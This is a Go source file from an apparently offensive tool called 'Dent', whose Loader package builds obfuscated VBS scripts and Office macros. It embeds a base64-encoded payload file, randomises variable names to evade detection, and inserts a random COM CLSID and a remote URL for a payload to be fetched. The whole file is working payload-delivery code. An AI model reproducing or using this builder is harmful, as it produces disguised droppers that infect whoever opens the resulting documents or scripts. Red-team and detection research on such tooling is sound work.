package Loader

import (
	"Dent/Cryptor"
	"Dent/Struct"
	"Dent/Utils"
	"bytes"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"strings"
	"text/template"
)

type Macro struct {
	Variables map[string]string
}
type VBS struct {
	Variables map[string]string
}

var (
	buffer bytes.Buffer
)

func VBS_Buff(filename string, COM string, inputFile string) string {
	var buffer bytes.Buffer
	vbs := &VBS{}
	vbs.Variables = make(map[string]string)
	//Macro variables//
	src, _ := ioutil.ReadFile(inputFile)
	b64ciphertext := base64.StdEncoding.EncodeToString(src)
	fmt.Println("[*] Creating Varible Names")
	vbs.Variables["wsh"] = Cryptor.VarNumberLength(4, 9)
	vbs.Variables["ComNAME"] = Cryptor.VarNumberLength(4, 9)
	vbs.Variables["CLSID"] = Cryptor.RandCLSID()
	vbs.Variables["COM"] = COM
	vbs.Variables["DLLName"] = filename
	vbs.Variables["appdata"] = Cryptor.VarNumberLength(4, 9)
	vbs.Variables["BinaryStream"] = Cryptor.VarNumberLength(4, 9)
	vbs.Variables["oNode"] = Cryptor.VarNumberLength(4, 9)
	vbs.Variables["contents"] = Cryptor.VarNumberLength(4, 9)
	vbs.Variables["b64"] = b64ciphertext
	vbs.Variables["outputFile"] = Cryptor.VarNumberLength(4, 9)
	vbs.Variables["oXML"] = Cryptor.VarNumberLength(4, 9)

	buffer.Reset()

	vbsTemplate, err := template.New("vbs").Parse(Struct.Fake_COM())
	if err != nil {
		log.Fatal(err)

	}
	buffer.Reset()
	if err := vbsTemplate.Execute(&buffer, vbs); err != nil {
		log.Fatal(err)
	}
	return buffer.String()
}

func Macro_Buff(mode string, Name string, URL string, brokenupstrings string, OutFile string, VarNum string, filename string) string {
	var buffer bytes.Buffer
	macro := &Macro{}
	macro.Variables = make(map[string]string)
	//Macro variables//
	fmt.Println("[*] Creating Varible Names")
	macro.Variables["function"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["sVersion"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["wsh"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["regpathh"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["regpathhh"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["regpath"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["bznabCx"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["tUyZ"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["lHapUtwZ"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["RZIVyI"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["fVqggL"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["AFjZ"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["jfIbu"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["bznabCx"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["lHapUtwZZ"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["strBase64"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["llHapUtwZ"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["strFilename"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["strFileContent"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["iFile"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["UseBinaryStreamType"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["SaveWillCreateOrOverwrite"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["streamOutput"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["xmlDoc"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["xmlElem"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["streamOutput"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["oXLD"] = Cryptor.VarNumberLength(4, 9)

	if strings.HasSuffix(URL, "/") {
		macro.Variables["URL"] = URL
	} else {
		macro.Variables["URL"] = "/" + URL
	}

	macro.Variables["XLLName"] = Name
	macro.Variables["OutFile"] = filename
	macro.Variables["Payload"] = brokenupstrings
	macro.Variables["VarNum"] = VarNum

	buffer.Reset()

	macroTemplate, err := template.New("macro").Parse(Struct.Remote_Struct())
	if err != nil {
		log.Fatal(err)

	}
	buffer.Reset()
	if err := macroTemplate.Execute(&buffer, macro); err != nil {
		log.Fatal(err)
	}
	return buffer.String()
}

func CompileLoader(mode string, OutFile string, b46code []string, Name string, inputFile string, URL string, COM string, filename string, show bool) {
	var VarNum string
	var brokenupstrings string
	if mode == "macro" {
		macro := Macro_Buff(mode, Name, URL, brokenupstrings, OutFile, VarNum, filename)
		Utils.Writefile(OutFile, macro)
		fmt.Println("[*] Writing Macro to " + OutFile)
		if show == true {
			fmt.Println("[!] Macro: ")
			fmt.Println(macro)
		}
		fmt.Println("[+] Macro Built...")
	} else if mode == "vbs" {
		vbs := VBS_Buff(Name, COM, inputFile)
		OutFile = strings.Replace(OutFile, ".txt", ".vbs", -1)
		Utils.Writefile(OutFile, vbs)
		fmt.Println("[*] Writing VBS Code to " + OutFile)
		if show == true {
			fmt.Println("[!] VBS Code: ")
			fmt.Println(vbs)
		}
		fmt.Println("[+] VBS Built...")
	}
}
